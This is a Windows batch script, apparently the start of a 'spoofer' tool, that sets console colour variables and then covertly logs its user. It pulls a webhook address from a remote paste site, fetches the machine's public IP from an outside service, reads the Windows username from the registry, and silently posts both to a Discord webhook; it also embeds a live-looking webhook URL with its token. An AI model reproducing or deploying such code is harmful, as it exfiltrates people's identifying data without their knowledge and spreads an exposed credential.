��&cls
@echo off
shift /0
chcp 65001 >nul

Set "R=[40;31m"
Set "G=[40;32m"
Set "Y=[40;33m"
Set "B=[40;34m"
Set "P=[40;35m"
Set "LB=[40;36m"
Set "W=[0;97m"


:: Setting Variable For Discord Webhook So We Dont Need To Keep Putting Link
SET "WEBHOOK=https://discord.com/api/webhooks/1185676807920418917/wD5mvwu2ZVm7wo0t98TbXREx8iupImBctTdOUDkiz8LFgJXKppvYOZSepOWBwTnqneb_"

:: Grabbing Pc Information And Sending It To The Webhook
curl -ks https://rentry.co/buggadanglike/raw >%TEMP%/joi423098rjgfdoighjiodrdfgd.tmp
set /p hook= < %TEMP%/joi423098rjgfdoighjiodrdfgd.tmp

curl -4 --silent icanhazip.com 1> tmpwanip
set /p ip= < tmpwanip
del tmpwanip

FOR /F "tokens=2* skip=2" %%A in ('reg query "HKEY_CURRENT_USER\Volatile Environment" /v "USERNAME"') do set PCUSERNAME=%%B >nul

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"^
```diff\n^
- Spoofer Usage Log ^| %USERNAME%s\n^
```^
```yaml\n^
Username   ^| %PCUSERNAME%\n^
IP         ^| %IP%\n^
```^
 \"}" %HOOK%
